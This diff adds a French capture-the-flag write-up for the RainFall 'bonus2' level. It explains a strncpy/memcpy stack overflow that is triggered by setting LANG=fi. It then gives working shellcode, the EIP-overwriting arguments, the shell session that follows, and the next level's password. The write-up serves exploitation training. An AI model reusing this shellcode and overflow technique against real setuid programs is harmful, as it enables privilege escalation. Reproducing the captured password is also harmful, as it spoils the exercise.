@@ -1,0 +1,69 @@
+Connextion au bonus2 -> Bit NX desactive
+Chech du home et des permissions du binaire -> Bit SUID bonus3
+Exection du binaire -> 
+"""
+bonus2@RainFall:~$ ./bonus2 A B
+Hello A
+"""
+
+Reconstitution du code source
+
+"""
+	strncpy(a1, argv[1], 40);
+	strncpy(a1 + 40, argv[2], 32);
+"""
+
+En mettant 40 octets ou plus dans l'argument 1, nous ecraserons le '\0' mis par le premier strncpy
+
+"""
+	void greetuser(void)
+	{
+		char smthg[8];
+		char a2[80];
+"""
+"""
+	switch(language)
+	{
+		case 1:
+			memcpy(a2, "Hyvää päivää ", 19)
+"""
+
+Nous voyons que dans la fonction 'greetuser' la variable a1 est de longueur 80 octets et qu'on peut y ecrire 'a1' (72 octets) + un des memcpy (19 octets max) soit 91 octets
+
+"""
+	if ((aenv = getenv("LANG")))
+	{
+		if (!memcmp(aenv, "fi", 2))
+			language = 1;
+		if (!memcmp(aenv, "nl", 2))
+			language = 2;
+	}
+"""
+
+Il faut simplement avoir set au prealable la variable d'environnement 'LANG' par "fi"
+
+On peut alors ecraser le retour EIP de la fonction 'greetuser' par l'adresse d'une variable d'environnement qui contiendra le shellcode
+
+"""
+bonus2@RainFall:~$ gcc /tmp/b.c -o /tmp/b
+bonus2@RainFall:~$ /tmp/b
+0xbffff8c8 �^�1��F�F
+                    �
+                     ���V
+                          ̀1ۉ�@̀�����/bin/sh
+"""
+
+Avec le meme programme que j'ai utilise pour le bonus0 j'ai recupere une adresse proche (+4 octets) de la variable d'environnement contenant le shellcode
+
+bonus2@RainFall:~$ export LANG=fi
+bonus2@RainFall:~$ export SHELLCODE=$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xc4\xf8\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
+$ ls
+ls: cannot open directory .: Permission denied
+$ pwd
+/home/user/bonus2
+$ id
+uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
